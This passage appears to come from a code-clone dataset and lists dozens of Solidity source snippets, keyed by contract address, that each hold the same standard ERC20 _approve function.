        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="98" endline="107" pcid="5614">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="99" endline="108" pcid="1954">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="103" endline="112" pcid="568">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="102" endline="111" pcid="6488">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="100" endline="109" pcid="4160">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="191" endline="200" pcid="1101">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="97" endline="106" pcid="6309">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="100" endline="109" pcid="2006">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="101" endline="110" pcid="8414">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="103" endline="112" pcid="6930">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="97" endline="106" pcid="3961">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="96" endline="105" pcid="6543">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="96" endline="105" pcid="931">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="100" endline="109" pcid="8871">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="95" endline="104" pcid="5488">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="100" endline="109" pcid="6975">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="97" endline="106" pcid="4392">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="99" endline="108" pcid="5473">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="97" endline="106" pcid="839">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="99" endline="108" pcid="8604">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="96" endline="105" pcid="7209">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="93" endline="102" pcid="6915">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="101" endline="110" pcid="2055">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="96" endline="105" pcid="1025">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="100" endline="109" pcid="8676">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="97" endline="106" pcid="5176">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="96" endline="105" pcid="1314">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="102" endline="111" pcid="5067">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="100" endline="109" pcid="350">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="100" endline="109" pcid="1116">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="100" endline="109" pcid="6845">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="98" endline="107" pcid="553">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="100" endline="109" pcid="1687">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="98" endline="107" pcid="438">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="98" endline="107" pcid="8279">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="103" endline="112" pcid="6109">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="97" endline="106" pcid="5535">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="99" endline="108" pcid="6768">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="96" endline="105" pcid="5206">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="96" endline="105" pcid="794">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="100" endline="109" pcid="7979">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="97" endline="106" pcid="8839">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="101" endline="110" pcid="995">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="100" endline="109" pcid="195">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="110" endline="119" pcid="7224">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="100" endline="109" pcid="7545">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="98" endline="107" pcid="5634">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="98" endline="107" pcid="7285">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="101" endline="110" pcid="6798">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="97" endline="106" pcid="7270">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="101" endline="110" pcid="1070">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="97" endline="106" pcid="5082">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="98" endline="107" pcid="4021">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="97" endline="106" pcid="5884">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="103" endline="112" pcid="8742">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="105" endline="114" pcid="8772">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="96" endline="105" pcid="5393">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="96" endline="105" pcid="5769">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="97" endline="106" pcid="5022">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="102" endline="111" pcid="4596">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="96" endline="105" pcid="7155">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="96" endline="105" pcid="8188">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="93" endline="102" pcid="3844">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="97" endline="106" pcid="9063">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="96" endline="105" pcid="7626">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="100" endline="109" pcid="2917">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="100" endline="109" pcid="2902">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="100" endline="109" pcid="1405">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="95" endline="104" pcid="2515">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="97" endline="106" pcid="2932">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="98" endline="107" pcid="2947">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="104" endline="113" pcid="2530">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="99" endline="108" pcid="2021">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="98" endline="107" pcid="7331">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="100" endline="109" pcid="7641">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="99" endline="108" pcid="2966">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="97" endline="106" pcid="2887">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="100" endline="109" pcid="2981">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="97" endline="106" pcid="6945">
